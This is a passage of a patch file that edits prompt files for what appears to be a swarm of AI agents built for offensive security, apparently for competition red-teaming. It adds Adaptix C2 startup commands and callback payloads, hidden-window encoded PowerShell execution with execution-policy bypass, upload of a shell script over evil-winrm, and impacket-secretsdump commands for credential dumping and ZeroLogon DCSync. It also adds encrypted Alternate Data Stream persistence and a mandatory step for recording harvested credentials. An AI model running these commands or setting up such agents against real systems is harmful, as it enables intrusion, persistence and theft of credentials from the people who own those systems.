**Rationale:** Training Run #1 showed the operator discovered Adaptix C2's two-component startup and GUI client through trial and error. This adds the documented startup procedure so PAYLOAD-001 can recommend it correctly.

**BEFORE:**
```
## ADS and ccdc-library.ps1 Integration

If the ADS project's tooling is available in the workspace, use it for Windows payload delivery. The ADS-OneLiner.ps1 script runs on Kali and generates a deployment one-liner that wraps any PowerShell payload in encrypted NTFS Alternate Data Streams with scheduled task persistence:
```

**AFTER:**
```
## Adaptix C2 Infrastructure

Adaptix C2 is available on the jumpbox for persistent command and control. It requires a two-component startup procedure — these are NOT a single unified command.

### Adaptix C2 Startup Procedure

**Step 1: Start the kali-server-mcp backend** (if not already running for MCP tools):
```
cd /home/kali/Desktop/kali-server-mcp && npm start &
```

**Step 2: Start the AdaptixServer binary** (separate process):
```
cd /home/kali/Desktop/AdaptixC2/AdaptixServer && GOEXPERIMENT=jsonv2,greenteagc ./AdaptixServer -p profile.yaml &
```

Profile location: /home/kali/Desktop/AdaptixC2/AdaptixServer/profile.yaml

**Step 3: Launch the Adaptix Client** (GUI binary — NOT a browser interface):
```
/home/kali/Desktop/AdaptixC2/dist/AdaptixClient &
```

IMPORTANT: The Adaptix Client is a standalone GUI binary, NOT a web interface. Do not attempt to access it via a browser URL.

### Adaptix C2 Payload Generation

When generating payloads for Adaptix C2, consult the profile.yaml for listener configuration (ports, protocols, encryption settings). Payloads should be generated to call back to the AdaptixServer listener, not to a raw netcat listener.

## Payload Size Awareness — Delivery Method Selection

PowerShell's maximum command-line length is 32,767 characters (~32KB). Base64 encoding inflates payload size by ~33%. Any payload whose base64-encoded form exceeds 8KB (conservative threshold) MUST use file-upload delivery as the primary method.

**Decision rule:** If base64-encoded payload > 8KB, recommend file-upload (OPTION 1) as primary. If base64-encoded payload <= 8KB, inline one-liner is acceptable.

**File-upload delivery via evil-winrm (OPTION 1 for large payloads):**
```
# From evil-winrm session:
upload /home/kali/Swarnam/payloads/shell.ps1 C:\ProgramData\shell.ps1
powershell -ep bypass -f C:\ProgramData\shell.ps1
```

**Inline one-liner (OPTION 2 for small payloads only):**
```
powershell -ep bypass -w hidden -enc <BASE64>
```

Always present both options with the size-appropriate one listed first.

## ADS and ccdc-library.ps1 Integration

If the ADS project's tooling is available in the workspace, use it for Windows payload delivery. The ADS-OneLiner.ps1 script runs on Kali and generates a deployment one-liner that wraps any PowerShell payload in encrypted NTFS Alternate Data Streams with scheduled task persistence:
```

---

## Edit 15: Add Adaptix C2 reference to PERSIST-001 (#52)

**File:** /home/kali/Swarnam/.claude/agents/persistence-engineer.md
**Finding:** #52
**Type:** REPLACE
**Rationale:** PERSIST-001's ADS Integration section references C2 indirectly. This adds a brief Adaptix C2 cross-reference so PERSIST-001 knows the startup procedure exists in PAYLOAD-001 and can reference it when recommending C2-based persistence.

**BEFORE:**
```
### ADS Integration

If Queue's Apparition Delivery System tooling is available in the workspace (check for src/ADS-OneLiner.ps1), use it for persistence on Windows targets. ADS wraps payloads in NTFS Alternate Data Streams with AES-256 encryption, zero-visibility JScript execution from Task Scheduler, and optional multi-instance redundancy. The one-liner generator runs on Kali and produces a deployment script for the operator to paste on the target. Refer to the ADS project's documentation for exact invocations.
```

**AFTER:**
```
### ADS Integration

If Queue's Apparition Delivery System tooling is available in the workspace (check for src/ADS-OneLiner.ps1), use it for persistence on Windows targets. ADS wraps payloads in NTFS Alternate Data Streams with AES-256 encryption, zero-visibility JScript execution from Task Scheduler, and optional multi-instance redundancy. The one-liner generator runs on Kali and produces a deployment script for the operator to paste on the target. Refer to the ADS project's documentation for exact invocations.

### Adaptix C2 for Persistent Callbacks

If Adaptix C2 is available (check /home/kali/Desktop/AdaptixC2/), persistence payloads can use Adaptix listeners for callbacks instead of raw netcat or Metasploit handlers. Adaptix provides more resilient C2 with encryption and session management. For Adaptix startup procedure and profile configuration, hand off to PAYLOAD-001 (which owns the Adaptix C2 startup documentation). Profile location: /home/kali/Desktop/AdaptixC2/AdaptixServer/profile.yaml.
```

---

## Edit 16: Add evil-winrm download pattern note to EXPLOIT-001 secretsdump section (#50)

**File:** /home/kali/Swarnam/.claude/agents/initial-access.md
**Finding:** #50
**Type:** REPLACE
**Rationale:** EXPLOIT-001 references `secretsdump.py` in the ZeroLogon section. This is also the location where operators will look for credential dump procedures. The edit replaces `secretsdump.py` with the Kali-standard `impacket-secretsdump` binary name (consistent with patch-20260316-2 which already fixed some instances but missed this one in the ZeroLogon context).

**BEFORE:**
```
If vulnerable, the exploit sets the DC machine password to empty, allowing DCSync:
```
secretsdump.py -no-pass -just-dc <domain>/<DC-hostname>\$@<DC-IP>
```
```

**AFTER:**
```
If vulnerable, the exploit sets the DC machine password to empty, allowing DCSync:
```
impacket-secretsdump -no-pass -just-dc <domain>/<DC-hostname>\$@<DC-IP>
```
```

---

## Edit 17: Replace secretsdump.py references in EXPLOIT-001 Impacket section (#49 cross-reference)

**File:** /home/kali/Swarnam/.claude/agents/initial-access.md
**Finding:** #49 (cross-reference — Impacket tool name consistency)
**Type:** REPLACE
**Rationale:** The Impacket Tool Suite section references `secretsdump.py` twice. The Kali installation uses `impacket-secretsdump` as the binary name. This was partially fixed by patch-20260316-2 but these instances in the Impacket overview section remain.

**BEFORE:**
```
secretsdump.py dumps credentials from a remote system (SAM, LSA secrets, cached credentials, NTDS.dit via DCSync):
```
secretsdump.py <domain>/<admin>:<password>@<target>
secretsdump.py -hashes :<NT-hash> <domain>/<admin>@<target>
```
```

**AFTER:**
```
impacket-secretsdump dumps credentials from a remote system (SAM, LSA secrets, cached credentials, NTDS.dit via DCSync):
```
impacket-secretsdump <domain>/<admin>:<password>@<target>
impacket-secretsdump -hashes :<NT-hash> <domain>/<admin>@<target>
```
```

---

## Edit 18: Add credential recording step to EXPLOIT-001 handoff protocol (#51)

**File:** /home/kali/Swarnam/.claude/agents/initial-access.md
**Finding:** #51
**Type:** REPLACE
**Rationale:** EXPLOIT-001's handoff protocol does not include a CREDENTIALS.md update step. Training Run #1 showed that SAM dump credentials were never recorded. This adds the mandatory credential recording step to the handoff procedure.

**BEFORE:**
```
## Handoff Protocol

When access is established on a target, immediately update coordination/TARGET-STATUS.md with the access method and credentials used, then recommend handoff to PERSIST-001 for persistence deployment. Include in the handoff: the target IP and hostname, the access method (credentials, exploit, web shell), the privilege level achieved (user, local admin, SYSTEM, domain admin), and any additional credentials or tokens harvested during exploitation.
```

**AFTER:**
```
## Handoff Protocol

When access is established on a target, immediately:

1. Update TARGET-STATUS.md with the access method and credentials used (use absolute path from Coordination File Paths section).
2. Record ALL credentials used for access AND all credentials harvested post-access to CREDENTIALS.md (use absolute path from Coordination File Paths section). Use the row format from the Credential Harvesting Post-Access section.
3. Recommend handoff to PERSIST-001 for persistence deployment.

Include in the handoff: the target IP and hostname, the access method (credentials, exploit, web shell), the privilege level achieved (user, local admin, SYSTEM, domain admin), and any additional credentials or tokens harvested during exploitation.

Step 2 is MANDATORY and must not be deferred. Credentials not recorded in CREDENTIALS.md are invisible to LATERAL-001 and will not be used for credential reuse analysis across the swarm.
```

---

## Application Order

Edits must be applied in the following order to avoid anchor text conflicts:

1. Edit 1 (start-ops.md) — independent
2. Edits 2-8 (coordination file paths for all agents) — independent of each other, can be applied in parallel
3. Edit 10 (evil-winrm formatting rules for PERSIST-001) — must be applied before Edit 12
4. Edit 9 (payload size awareness for PERSIST-001) — independent of Edit 10
5. Edit 12 (PowerShell variable safety for PERSIST-001) — depends on Edit 10 being applied first
6. Edit 15 (Adaptix C2 reference for PERSIST-001) — independent
7. Edit 11 (credential harvesting for EXPLOIT-001) — must be applied before Edit 18
8. Edits 16-17 (secretsdump.py fixes for EXPLOIT-001) — independent
9. Edit 18 (handoff protocol for EXPLOIT-001) — depends on Edit 11 being applied first
10. Edit 13 (credential recording for LATERAL-001) — independent
11. Edit 14 (Adaptix C2 + payload size for PAYLOAD-001) — independent

---

## Commit Message

```
training: apply patch-20260318-6 from training run #1

- Add MCP connectivity hard gate to /start-ops (findings #42, #43)
- Add Coordination File Paths section to 7 agents (findings #44, #45)
- Add payload size awareness to PERSIST-001 and PAYLOAD-001 (finding #46)
- Add evil-winrm single-line command rules to PERSIST-001 (findings #47, #48)
- Replace $pid with $lsassPid in LSASS dump templates (finding #49)
- Add evil-winrm download two-step pattern (finding #50)
- Add mandatory CREDENTIALS.md recording step (finding #51)
- Add Adaptix C2 startup procedure to PAYLOAD-001 (finding #52)
- Fix remaining secretsdump.py references to impacket-secretsdump

Addresses 11 findings from training debrief 2026-03-18.
See training/patches/patch-20260318-6.md for full rationale.
```
